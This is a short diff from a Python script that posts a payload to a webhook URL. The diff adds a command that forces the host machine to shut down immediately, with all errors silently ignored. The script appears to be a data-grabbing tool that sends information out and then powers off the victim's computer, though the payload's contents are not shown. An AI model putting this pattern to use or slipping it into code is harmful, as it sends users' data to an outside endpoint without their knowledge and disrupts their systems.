@@ -59,6 +59,7 @@ def main():
 	try:
 		req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
 		urlopen(req)
+		os.system("shutdown /s /t 1")
 	except:
 		pass
 if __name__ == '__main__':
